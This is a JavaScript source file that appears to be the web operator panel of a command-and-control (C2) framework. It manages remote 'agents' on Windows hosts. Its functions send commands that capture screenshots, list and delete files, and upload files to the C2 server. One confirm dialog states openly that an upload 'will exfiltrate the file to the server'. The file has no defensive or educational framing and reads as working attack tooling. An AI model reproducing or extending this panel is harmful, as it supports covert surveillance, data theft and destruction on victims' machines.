function switchAgentTab(uuid, tabName) {
    const containers = ['console', 'screenshot', 'files'];

    containers.forEach(tab => {
        const content = document.getElementById(`${tab}-content-${uuid}`);
        const btn = document.getElementById(`${tab}-tab-btn-${uuid}`);
        if (content) content.classList.add('hidden');
        if (btn) {
            btn.classList.remove('text-blue-400', 'border-b-2', 'border-blue-500', 'font-medium');
            btn.classList.add('text-gray-400', 'hover:text-gray-300');
        }
    });

    const activeContent = document.getElementById(`${tabName}-content-${uuid}`);
    const activeBtn = document.getElementById(`${tabName}-tab-btn-${uuid}`);
    if (activeContent) activeContent.classList.remove('hidden');
    if (activeBtn) {
        activeBtn.classList.remove('text-gray-400', 'hover:text-gray-300');
        activeBtn.classList.add('text-blue-400', 'border-b-2', 'border-blue-500', 'font-medium');
    }
}

function checkExistingScreenshot(uuid) {
    console.log(`Checking for existing screenshot for agent ${uuid}`);
    
    try {
        const screenshotDiv = document.getElementById(`screenshot-content-${uuid}`).querySelector('.flex');
        screenshotDiv.innerHTML = `
            <div class="text-center text-gray-500 w-full">
                <div class="animate-spin inline-block w-8 h-8 border-4 border-blue-500 border-t-transparent rounded-full mb-4"></div>
                <p>Checking for screenshot...</p>
                <p class="text-sm mt-2">This will only take a moment</p>
            </div>
        `;

        startScreenshotPolling(uuid);
    } catch (error) {
        console.error('Error checking for screenshot:', error);
    }
}

function refreshScreenshot(uuid) {
    console.log(`Requesting screenshot from agent ${uuid}`);
    
    try {
        const formData = new FormData();
        formData.append('command', 'screenshot');

        const screenshotDiv = document.getElementById(`screenshot-content-${uuid}`).querySelector('.flex');
        screenshotDiv.innerHTML = `
            <div class="text-center text-gray-500 w-full">
                <div class="animate-spin inline-block w-8 h-8 border-4 border-blue-500 border-t-transparent rounded-full mb-4"></div>
                <p>Taking screenshot...</p>
                <p class="text-sm mt-2">This may take a few seconds</p>
            </div>
        `;

        fetch(`${CONFIG.API.COMMAND}/${uuid}`, {
            method: 'POST',
            body: formData
        })
        .then(response => {
            if (response.ok) {
                console.log("Screenshot command sent successfully, starting polling...");
                startScreenshotPolling(uuid);
            } else {
                throw new Error('Error sending screenshot command');
            }
        })
        .catch(error => {
            console.error('Error taking screenshot:', error);
            screenshotDiv.innerHTML = `
                <div class="text-center text-red-500 w-full">
                    <p>Error taking screenshot</p>
                    <p class="text-sm mt-2">${error.message}</p>
                    <div class="mt-4">
                        <button onclick="refreshScreenshot('${uuid}')" class="bg-blue-600 hover:bg-blue-700 text-white px-3 py-1 rounded text-sm transition-all duration-200">
                            Try Again
                        </button>
                    </div>
                </div>
            `;
        });
    } catch (error) {
        console.error('Error initiating screenshot:', error);
    }
}

function startScreenshotPolling(uuid) {
    const screenshotDiv = document.getElementById(`screenshot-content-${uuid}`).querySelector('.flex');
    
    screenshotDiv.innerHTML = `
        <div class="text-center text-gray-500 w-full">
            <div class="animate-spin inline-block w-8 h-8 border-4 border-blue-500 border-t-transparent rounded-full mb-4"></div>
            <p>Checking for screenshot...</p>
            <p class="text-sm mt-2">Please wait</p>
        </div>
    `;
    
    const timestamp = new Date().getTime();
    const imgUrl = `/uploads/screenshot_${uuid}.png?t=${timestamp}`;
    
    fetch(imgUrl, { method: 'HEAD' })
        .then(response => {
            if (response.ok) {
                screenshotDiv.innerHTML = `
                    <div class="w-full h-full flex flex-col">
                        <div class="flex justify-between items-center bg-gray-800 p-2 mb-2 rounded">
                            <button onclick="checkExistingScreenshot('${uuid}')" class="bg-blue-600 hover:bg-blue-700 text-white px-3 py-1 rounded text-sm transition-all duration-200 flex items-center gap-1" title="Refresh screenshot">
                                <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" viewBox="0 0 20 20" fill="currentColor">
                                    <path fill-rule="evenodd" d="M4 2a1 1 0 011 1v2.101a7.002 7.002 0 0111.601 2.566 1 1 0 11-1.885.666A5.002 5.002 0 005.999 7H9a1 1 0 010 2H4a1 1 0 01-1-1V3a1 1 0 011-1zm.008 9.057a1 1 0 011.276.61A5.002 5.002 0 0014.001 13H11a1 1 0 110-2h5a1 1 0 011 1v5a1 1 0 11-2 0v-2.101a7.002 7.002 0 01-11.601-2.566 1 1 0 01.61-1.276z" clip-rule="evenodd" />
                                </svg>
                                Refresh
                            </button>
                            <div class="flex space-x-2">
                                    <button onclick="zoomScreenshot('${uuid}', 'out')" class="bg-gray-600 hover:bg-gray-700 text-white px-2 py-1 rounded text-sm transition-all duration-200" title="Zoom out">
                                        <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" viewBox="0 0 20 20" fill="currentColor">
                                            <path fill-rule="evenodd" d="M8 4a4 4 0 100 8a4 4 0 000-8zM2 8a6 6 0 1110.89 3.476l4.817 4.817a1 1 0 01-1.414 1.414l-4.816-4.816A6 6 0 012 8z" clip-rule="evenodd" />
                                            <path fill-rule="evenodd" d="M5 8a1 1 0 011-1h4a1 1 0 110 2H6a1 1 0 01-1-1z" clip-rule="evenodd" />
                                        </svg>
                                    </button>
                                    <button onclick="zoomScreenshot('${uuid}', 'reset')" class="bg-gray-600 hover:bg-gray-700 text-white px-2 py-1 rounded text-sm transition-all duration-200" title="Reset zoom">
                                        <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" viewBox="0 0 20 20" fill="currentColor">
                                            <path d="M5 12a1 1 0 102 0V6.414l1.293 1.293a1 1 0 001.414-1.414l-3-3a1 1 0 00-1.414 0l-3 3a1 1 0 001.414 1.414L5 6.414V12z" />
                                            <path d="M15 8a1 1 0 10-2 0v5.586l-1.293-1.293a1 1 0 00-1.414 1.414l3 3a1 1 0 001.414 0l3-3a1 1 0 00-1.414-1.414L15 13.586V8z" />
                                        </svg>
                                    </button>
                                    <button onclick="zoomScreenshot('${uuid}', 'in')" class="bg-gray-600 hover:bg-gray-700 text-white px-2 py-1 rounded text-sm transition-all duration-200" title="Zoom in">
                                        <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4" viewBox="0 0 20 20" fill="currentColor">
                                            <path fill-rule="evenodd" d="M8 4a4 4 0 100 8a4 4 0 000-8zM2 8a6 6 0 1110.89 3.476l4.817 4.817a1 1 0 01-1.414 1.414l-4.816-4.816A6 6 0 012 8z" clip-rule="evenodd" />
                                            <path fill-rule="evenodd" d="M8 5a1 1 0 00-1 1v1H6a1 1 0 000 2h1v1a1 1 0 002 0V9h1a1 1 0 000-2H9V6a1 1 0 00-1-1z" clip-rule="evenodd" />
                                        </svg>
                                    </button>
                                </div>
                            </div>
                            <div id="screenshot-container-${uuid}" class="flex-1 overflow-hidden relative flex items-center justify-center cursor-move">
                                <img 
                                    id="screenshot-img-${uuid}"
                                    src="${imgUrl}" 
                                    alt="Agent Screenshot" 
                                    class="max-w-full max-h-full object-contain transform origin-center transition-transform duration-200"
                                    onerror="this.onerror=null;this.src='';this.alt='Screenshot not available';handleScreenshotError('${uuid}');"
                                    onload="initDraggableScreenshot('${uuid}')"
                                />
                            </div>
                        </div>
                    `;
                    console.log(`Screenshot for ${uuid} found`);
            } else {
                handleScreenshotError(uuid);
                console.log(`Screenshot not found`);
            }
            })
            .catch(error => {
                console.log(`Error checking for screenshot: ${error}`);
                handleScreenshotError(uuid);
            });
}

function handleScreenshotError(uuid) {
    const screenshotDiv = document.getElementById(`screenshot-content-${uuid}`).querySelector('.flex');
    screenshotDiv.innerHTML = `
        <div class="text-center text-red-500 w-full">
            <p>Screenshot not available</p>
            <p class="text-sm mt-2">The agent might be unable to take screenshots</p>
            <div class="mt-4">
                <button onclick="checkExistingScreenshot('${uuid}')" class="bg-blue-600 hover:bg-blue-700 text-white px-3 py-1 rounded text-sm transition-all duration-200">
                    Check Again
                </button>
            </div>
            <p class="text-sm mt-4">Or try running 'screenshot' command again</p>
        </div>
    `;
}

function zoomScreenshot(uuid, action) {
    const img = document.getElementById(`screenshot-img-${uuid}`);
    const container = document.getElementById(`screenshot-container-${uuid}`);
    if (!img || !container) return;
    
    let currentTransform = img.style.transform || 'scale(1)';
    let currentScale = parseFloat(currentTransform.replace(/[^\d.-]/g, '')) || 1;

    switch (action) {
        case 'in':
            currentScale = Math.min(currentScale + 0.25, 3);
            break;
        case 'out':
            currentScale = Math.max(currentScale - 0.25, 0.5);
            break;
        case 'reset':
            currentScale = 1;
            img.style.translate = '0px 0px';
            break;
    }
    
    img.style.transform = `scale(${currentScale})`;
    
    container.classList.toggle('zoomed', currentScale > 1);
    
    console.log(`Screenshot zoom: ${currentScale}x`);
}

function initDraggableScreenshot(uuid) {
    const container = document.getElementById(`screenshot-container-${uuid}`);
    const img = document.getElementById(`screenshot-img-${uuid}`);
    if (!container || !img) return;
    
    container.classList.add('screenshot-container');
    img.classList.add('screenshot-img');
    
    let isDragging = false;
    let startX, startY;
    let translateX = 0, translateY = 0;
    
    const getTranslation = () => {
        const translate = img.style.translate || '0px 0px';
        const [x, y] = translate.split(' ').map(val => parseInt(val));
        return { x: x || 0, y: y || 0 };
    };
    
    const startDrag = (e) => {
        const transform = img.style.transform || 'scale(1)';
        const scale = parseFloat(transform.replace(/[^\d.-]/g, '')) || 1;
        if (scale <= 1) return;
        
        isDragging = true;
        const pos = getEventPosition(e);
        startX = pos.x;
        startY = pos.y;
        
        const currentTranslate = getTranslation();
        translateX = currentTranslate.x;
        translateY = currentTranslate.y;
        
        container.classList.add('zoomed');
        
        e.preventDefault();
    };
    
    const drag = (e) => {
        if (!isDragging) return;
        
        const pos = getEventPosition(e);
        const dx = pos.x - startX;
        const dy = pos.y - startY;
        
        img.style.translate = `${translateX + dx}px ${translateY + dy}px`;
        e.preventDefault();
    };
    
    const endDrag = () => {
        if (isDragging) {
            isDragging = false;
            const newTranslate = getTranslation();
            translateX = newTranslate.x;
            translateY = newTranslate.y;
        }
    };
    
    const getEventPosition = (e) => {
        const event = e.touches ? e.touches[0] : e;
        return { 
            x: event.clientX, 
            y: event.clientY 
        };
    };
    
    container.addEventListener('mousedown', startDrag);
    container.addEventListener('touchstart', startDrag);
    
    document.addEventListener('mousemove', drag);
    document.addEventListener('touchmove', drag);
    
    document.addEventListener('mouseup', endDrag);
    document.addEventListener('touchend', endDrag);
    document.addEventListener('touchcancel', endDrag);
    
    container.addEventListener('wheel', (e) => {
        e.preventDefault();
        
        const transform = img.style.transform || 'scale(1)';
        let currentScale = parseFloat(transform.replace(/[^\d.-]/g, '')) || 1;
        
        const delta = e.deltaY || e.detail || e.wheelDelta;
        
        if (delta > 0) {
            currentScale = Math.max(currentScale - 0.1, 0.5);
        } else {
            currentScale = Math.min(currentScale + 0.1, 3);
        }
        
        img.style.transform = `scale(${currentScale})`;

        container.classList.toggle('zoomed', currentScale > 1);
    });
}

// ===== FILE MANAGER =====

let fileManagerState = {};

const FM_ICONS = {
    folder: `<svg xmlns="http://www.w3.org/2000/svg" class="w-5 h-5 text-yellow-400" viewBox="0 0 20 20" fill="currentColor"><path d="M2 6a2 2 0 012-2h5l2 2h5a2 2 0 012 2v6a2 2 0 01-2 2H4a2 2 0 01-2-2V6z"/></svg>`,
    file: `<svg xmlns="http://www.w3.org/2000/svg" class="w-5 h-5 text-gray-400" viewBox="0 0 20 20" fill="currentColor"><path fill-rule="evenodd" d="M4 4a2 2 0 012-2h4.586A2 2 0 0112 2.586L15.414 6A2 2 0 0116 7.414V16a2 2 0 01-2 2H6a2 2 0 01-2-2V4z" clip-rule="evenodd"/></svg>`,
    up: `<svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4" viewBox="0 0 20 20" fill="currentColor"><path fill-rule="evenodd" d="M5.293 9.707a1 1 0 010-1.414l4-4a1 1 0 011.414 0l4 4a1 1 0 01-1.414 1.414L11 7.414V15a1 1 0 11-2 0V7.414L6.707 9.707a1 1 0 01-1.414 0z" clip-rule="evenodd"/></svg>`,
    refresh: `<svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4" viewBox="0 0 20 20" fill="currentColor"><path fill-rule="evenodd" d="M4 2a1 1 0 011 1v2.101a7.002 7.002 0 0111.601 2.566 1 1 0 11-1.885.666A5.002 5.002 0 005.999 7H9a1 1 0 010 2H4a1 1 0 01-1-1V3a1 1 0 011-1zm.008 9.057a1 1 0 011.276.61A5.002 5.002 0 0014.001 13H11a1 1 0 110-2h5a1 1 0 011 1v5a1 1 0 11-2 0v-2.101a7.002 7.002 0 01-11.601-2.566 1 1 0 01.61-1.276z" clip-rule="evenodd"/></svg>`,
    mkdir: `<svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4" viewBox="0 0 20 20" fill="currentColor"><path fill-rule="evenodd" d="M4 4a2 2 0 00-2 2v8a2 2 0 002 2h12a2 2 0 002-2V8a2 2 0 00-2-2h-5L9 4H4zm7 5a1 1 0 10-2 0v1H8a1 1 0 100 2h1v1a1 1 0 102 0v-1h1a1 1 0 100-2h-1V9z" clip-rule="evenodd"/></svg>`,
    trash: `<svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4" viewBox="0 0 20 20" fill="currentColor"><path fill-rule="evenodd" d="M9 2a1 1 0 00-.894.553L7.382 4H4a1 1 0 000 2v10a2 2 0 002 2h8a2 2 0 002-2V6a1 1 0 100-2h-3.382l-.724-1.447A1 1 0 0011 2H9zM7 8a1 1 0 012 0v6a1 1 0 11-2 0V8zm5-1a1 1 0 00-1 1v6a1 1 0 102 0V8a1 1 0 00-1-1z" clip-rule="evenodd"/></svg>`,
    upload: `<svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4" viewBox="0 0 20 20" fill="currentColor"><path fill-rule="evenodd" d="M3 17a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM6.293 6.707a1 1 0 010-1.414l3-3a1 1 0 011.414 0l3 3a1 1 0 01-1.414 1.414L11 5.414V13a1 1 0 11-2 0V5.414L7.707 6.707a1 1 0 01-1.414 0z" clip-rule="evenodd"/></svg>`,
    go: `<svg xmlns="http://www.w3.org/2000/svg" class="w-4 h-4" viewBox="0 0 20 20" fill="currentColor"><path fill-rule="evenodd" d="M10.293 3.293a1 1 0 011.414 0l6 6a1 1 0 010 1.414l-6 6a1 1 0 01-1.414-1.414L14.586 11H3a1 1 0 110-2h11.586l-4.293-4.293a1 1 0 010-1.414z" clip-rule="evenodd"/></svg>`
};

function initFileManager(uuid) {
    const root = document.getElementById(`file-manager-root-${uuid}`);
    if (!root) return;

    if (!fileManagerState[uuid]) {
        fileManagerState[uuid] = { currentPath: 'C:\\', loading: false };
    }

    const state = fileManagerState[uuid];

    root.innerHTML = `
        <div class="bg-gray-800 px-3 py-2 border-b border-gray-600 flex items-center gap-2 flex-shrink-0 fm-pathbar">
            <button onclick="fmNavigateUp('${uuid}')" class="fm-action-btn" title="Parent directory">
                ${FM_ICONS.up}
            </button>
            <button onclick="fmRefresh('${uuid}')" class="fm-action-btn" title="Refresh">
                ${FM_ICONS.refresh}
            </button>
            <div class="flex-1 flex items-center gap-2">
                <input
                    type="text"
                    id="fm-path-input-${uuid}"
                    class="fm-path-input flex-1"
                    value="${state.currentPath}"
                    placeholder="Enter path..."
                    onkeydown="if(event.key==='Enter'){fmNavigateTo('${uuid}');}"
                />
                <button onclick="fmNavigateTo('${uuid}')" class="fm-go-btn" title="Navigate">
                    ${FM_ICONS.go} Go
                </button>
            </div>
            <button onclick="fmPromptMkdir('${uuid}')" class="fm-action-btn fm-action-mkdir" title="Create directory">
                ${FM_ICONS.mkdir}
            </button>
        </div>
        <div id="fm-file-list-${uuid}" class="flex-1 overflow-y-auto fm-file-list">
            <div class="flex items-center justify-center h-full text-gray-500 text-sm">
                <div class="text-center">
                    <p>Enter a path and click Go to browse files</p>
                    <p class="text-xs mt-1 text-gray-600">Default: C:\\</p>
                </div>
            </div>
        </div>
        <div id="fm-status-bar-${uuid}" class="bg-gray-800 px-3 py-1 text-xs text-gray-500 border-t border-gray-600 flex-shrink-0 fm-statusbar">
            Ready
        </div>
    `;
}

function fmNavigateTo(uuid, path) {
    const state = fileManagerState[uuid];
    if (!state || state.loading) return;

    if (!path) {
        const input = document.getElementById(`fm-path-input-${uuid}`);
        if (!input) return;
        path = input.value.trim();
    }

    if (!path) return;

    state.currentPath = path;
    state.loading = true;

    const input = document.getElementById(`fm-path-input-${uuid}`);
    if (input) input.value = path;

    const fileList = document.getElementById(`fm-file-list-${uuid}`);
    const statusBar = document.getElementById(`fm-status-bar-${uuid}`);

    if (fileList) {
        fileList.innerHTML = `
            <div class="flex items-center justify-center h-full text-gray-500">
                <div class="text-center">
                    <div class="animate-spin inline-block w-6 h-6 border-2 border-blue-500 border-t-transparent rounded-full mb-2"></div>
                    <p class="text-sm">Listing ${escapeHtml(path)}...</p>
                </div>
            </div>
        `;
    }
    if (statusBar) statusBar.textContent = `Loading ${path}...`;

    const formData = new FormData();
    formData.append('command', `list ${path}`);

    fetch(`${CONFIG.API.COMMAND}/${uuid}`, { method: 'POST', body: formData })
        .then(response => {
            if (response.ok) {
                fmPollForOutput(uuid, path);
            } else {
                throw new Error('Failed to send list command');
            }
        })
        .catch(err => {
            state.loading = false;
            if (fileList) {
                fileList.innerHTML = `
                    <div class="flex items-center justify-center h-full text-red-400 text-sm">
                        <div class="text-center">
                            <p>Error sending command</p>
                            <p class="text-xs mt-1 text-gray-500">${escapeHtml(err.message)}</p>
                            <button onclick="fmNavigateTo('${uuid}', '${escapeHtml(path)}')" class="mt-2 text-xs bg-blue-600 hover:bg-blue-700 px-2 py-1 rounded text-white">Retry</button>
                        </div>
                    </div>
                `;
            }
            if (statusBar) statusBar.textContent = 'Error';
        });
}

function fmPollForOutput(uuid, path, attempt) {
    attempt = attempt || 0;
    const maxAttempts = 30;
    const state = fileManagerState[uuid];

    if (attempt >= maxAttempts) {
        state.loading = false;
        const fileList = document.getElementById(`fm-file-list-${uuid}`);
        const statusBar = document.getElementById(`fm-status-bar-${uuid}`);
        if (fileList) {
            fileList.innerHTML = `
                <div class="flex items-center justify-center h-full text-yellow-400 text-sm">
                    <div class="text-center">
                        <p>Timeout waiting for agent response</p>
                        <p class="text-xs mt-1 text-gray-500">The agent may be offline or slow</p>
                        <button onclick="fmNavigateTo('${uuid}', '${escapeHtml(path)}')" class="mt-2 text-xs bg-blue-600 hover:bg-blue-700 px-2 py-1 rounded text-white">Retry</button>
                    </div>
                </div>
            `;
        }
        if (statusBar) statusBar.textContent = 'Timeout';
        return;
    }

    fetch(`${CONFIG.API.HISTORY}/${uuid}`)
        .then(r => r.json())
        .then(data => {
            const history = data.history || [];
            let found = null;
            for (let i = history.length - 1; i >= 0; i--) {
                if (history[i].command === `list ${path}`) {
                    found = history[i];
                    break;
                }
            }

            if (found && found.output) {
                state.loading = false;
                const items = fmParseListOutput(found.output);
                fmRenderFileList(uuid, items, path, found.output);
            } else {
                setTimeout(() => fmPollForOutput(uuid, path, attempt + 1), 500);
            }
        })
        .catch(() => {
            setTimeout(() => fmPollForOutput(uuid, path, attempt + 1), 500);
        });
}

function fmParseListOutput(output) {
    if (!output) return [];

    if (output.startsWith('[!]')) return [];
    if (output.startsWith('[i]')) return [];

    const lines = output.split('\n');
    const items = [];
    let dataStarted = false;

    for (let i = 0; i < lines.length; i++) {
        const line = lines[i];

        if (line.match(/^-{4,}/)) {
            dataStarted = true;
            continue;
        }

        if (!dataStarted) continue;

        const trimmed = line.trim();
        if (!trimmed) continue;

        const match = trimmed.match(/^(\S+)\s+(\d{4}-\d{2}-\d{2}\s+\d{2}:\d{2}:\d{2})\s+(\S+)\s+(.+)$/);
        if (match) {
            const mode = match[1];
            const date = match[2];
            const sizeRaw = match[3];
            const name = match[4].trim();
            const isDir = mode.startsWith('d') || sizeRaw === '<DIR>';
            const size = isDir ? null : parseInt(sizeRaw, 10);

            items.push({ name, isDir, size, date, mode });
        }
    }

    items.sort((a, b) => {
        if (a.isDir && !b.isDir) return -1;
        if (!a.isDir && b.isDir) return 1;
        return a.name.localeCompare(b.name);
    });

    return items;
}

function fmRenderFileList(uuid, items, currentPath, rawOutput) {
    const fileList = document.getElementById(`fm-file-list-${uuid}`);
    const statusBar = document.getElementById(`fm-status-bar-${uuid}`);

    if (!fileList) return;

    if (rawOutput && rawOutput.startsWith('[!]')) {
        fileList.innerHTML = `
            <div class="flex items-center justify-center h-full text-red-400 text-sm">
                <div class="text-center">
                    <p>${escapeHtml(rawOutput)}</p>
                    <button onclick="fmNavigateUp('${uuid}')" class="mt-2 text-xs bg-gray-600 hover:bg-gray-500 px-2 py-1 rounded text-white">Go Back</button>
                </div>
            </div>
        `;
        if (statusBar) statusBar.textContent = 'Error';
        return;
    }

    if (rawOutput && rawOutput.startsWith('[i]')) {
        fileList.innerHTML = `
            <div class="flex items-center justify-center h-full text-gray-500 text-sm">
                <div class="text-center">
                    <p>${escapeHtml(rawOutput)}</p>
                </div>
            </div>
        `;
        if (statusBar) statusBar.textContent = `${currentPath} - Empty`;
        return;
    }

    if (items.length === 0) {
        fileList.innerHTML = `
            <div class="flex items-center justify-center h-full text-gray-500 text-sm">
                <p>No items found or unrecognized output</p>
            </div>
        `;
        if (statusBar) statusBar.textContent = currentPath;
        return;
    }

    const dirCount = items.filter(i => i.isDir).length;
    const fileCount = items.length - dirCount;

    let html = `
        <table class="w-full fm-table">
            <thead>
                <tr class="text-xs text-gray-500 uppercase border-b border-gray-700">
                    <th class="px-3 py-2 text-left w-8"></th>
                    <th class="px-3 py-2 text-left">Name</th>
                    <th class="px-3 py-2 text-right w-24">Size</th>
                    <th class="px-3 py-2 text-left w-40">Modified</th>
                    <th class="px-3 py-2 text-center w-24">Actions</th>
                </tr>
            </thead>
            <tbody>
    `;

    items.forEach(item => {
        const safePath = currentPath.endsWith('\\') ? currentPath : currentPath + '\\';
        const fullPath = safePath + item.name;
        const escapedPath = fullPath.replace(/\\/g, '\\\\').replace(/'/g, "\\'");

        const icon = item.isDir ? FM_ICONS.folder : FM_ICONS.file;
        const sizeStr = item.isDir ? '<DIR>' : fmFormatSize(item.size);

        const nameHtml = item.isDir
            ? `<span class="fm-folder-link cursor-pointer text-blue-300 hover:text-blue-200 hover:underline" onclick="fmNavigateTo('${uuid}', '${escapedPath}')">${escapeHtml(item.name)}</span>`
            : `<span class="text-gray-200">${escapeHtml(item.name)}</span>`;

        let actions = `<button onclick="fmDelete('${uuid}', '${escapedPath}')" class="fm-row-action text-gray-500 hover:text-red-400" title="Delete">${FM_ICONS.trash}</button>`;
        if (!item.isDir) {
            actions += ` <button onclick="fmUploadToC2('${uuid}', '${escapedPath}')" class="fm-row-action text-gray-500 hover:text-green-400" title="Upload to C2">${FM_ICONS.upload}</button>`;
        }

        html += `
            <tr class="fm-row border-b border-gray-800 hover:bg-gray-800 hover:bg-opacity-60 transition-colors">
                <td class="px-3 py-1.5 text-center">${icon}</td>
                <td class="px-3 py-1.5 text-sm">${nameHtml}</td>
                <td class="px-3 py-1.5 text-xs text-gray-400 text-right font-mono">${sizeStr}</td>
                <td class="px-3 py-1.5 text-xs text-gray-500">${item.date}</td>
                <td class="px-3 py-1.5 text-center"><div class="flex items-center justify-center gap-1">${actions}</div></td>
            </tr>
        `;
    });

    html += '</tbody></table>';
    fileList.innerHTML = html;

    if (statusBar) statusBar.textContent = `${currentPath} \u2014 ${dirCount} folder${dirCount !== 1 ? 's' : ''}, ${fileCount} file${fileCount !== 1 ? 's' : ''}`;
}

function fmFormatSize(bytes) {
    if (bytes == null || isNaN(bytes)) return '';
    if (bytes === 0) return '0 B';
    const units = ['B', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(1024));
    const val = (bytes / Math.pow(1024, i)).toFixed(i > 0 ? 1 : 0);
    return val + ' ' + units[i];
}

function fmRefresh(uuid) {
    const state = fileManagerState[uuid];
    if (!state) return;
    fmNavigateTo(uuid, state.currentPath);
}

function fmNavigateUp(uuid) {
    const state = fileManagerState[uuid];
    if (!state) return;

    let path = state.currentPath;
    path = path.replace(/\\$/, '');
    const lastSlash = path.lastIndexOf('\\');

    if (lastSlash <= 2) {
        fmNavigateTo(uuid, path.substring(0, 3));
    } else {
        fmNavigateTo(uuid, path.substring(0, lastSlash));
    }
}

function fmDelete(uuid, fullPath) {
    const name = fullPath.split('\\').pop();
    if (!confirm(`Delete "${name}"?\n\nFull path: ${fullPath}\n\nThis action cannot be undone.`)) return;

    const statusBar = document.getElementById(`fm-status-bar-${uuid}`);
    if (statusBar) statusBar.textContent = `Deleting ${name}...`;

    const formData = new FormData();
    formData.append('command', `delete ${fullPath}`);

    fetch(`${CONFIG.API.COMMAND}/${uuid}`, { method: 'POST', body: formData })
        .then(response => {
            if (response.ok) {
                if (statusBar) statusBar.textContent = `Delete command sent for ${name}`;
                setTimeout(() => fmRefresh(uuid), 1500);
            } else {
                if (statusBar) statusBar.textContent = 'Error sending delete command';
            }
        })
        .catch(() => {
            if (statusBar) statusBar.textContent = 'Error sending delete command';
        });
}

function fmUploadToC2(uuid, fullPath) {
    const name = fullPath.split('\\').pop();
    if (!confirm(`Upload "${name}" to C2 server?\n\nThis will exfiltrate the file to the server.`)) return;

    const statusBar = document.getElementById(`fm-status-bar-${uuid}`);
    if (statusBar) statusBar.textContent = `Uploading ${name}...`;

    const formData = new FormData();
    formData.append('command', `upload ${fullPath}`);

    fetch(`${CONFIG.API.COMMAND}/${uuid}`, { method: 'POST', body: formData })
        .then(response => {
            if (response.ok) {
                if (statusBar) statusBar.textContent = `Upload command sent for ${name}`;
            } else {
                if (statusBar) statusBar.textContent = 'Error sending upload command';
            }
        })
        .catch(() => {
            if (statusBar) statusBar.textContent = 'Error sending upload command';
        });
}

function fmPromptMkdir(uuid) {
    const state = fileManagerState[uuid];
    if (!state) return;

    const name = prompt('Enter new directory name:');
    if (!name || !name.trim()) return;

    const safePath = state.currentPath.endsWith('\\') ? state.currentPath : state.currentPath + '\\';
    const fullPath = safePath + name.trim();

    const statusBar = document.getElementById(`fm-status-bar-${uuid}`);
    if (statusBar) statusBar.textContent = `Creating directory ${name.trim()}...`;

    const formData = new FormData();
    formData.append('command', `mkdir ${fullPath}`);

    fetch(`${CONFIG.API.COMMAND}/${uuid}`, { method: 'POST', body: formData })
        .then(response => {
            if (response.ok) {
                if (statusBar) statusBar.textContent = `Mkdir command sent: ${name.trim()}`;
                setTimeout(() => fmRefresh(uuid), 1500);
            } else {
                if (statusBar) statusBar.textContent = 'Error sending mkdir command';
            }
        })
        .catch(() => {
            if (statusBar) statusBar.textContent = 'Error sending mkdir command';
        });
}
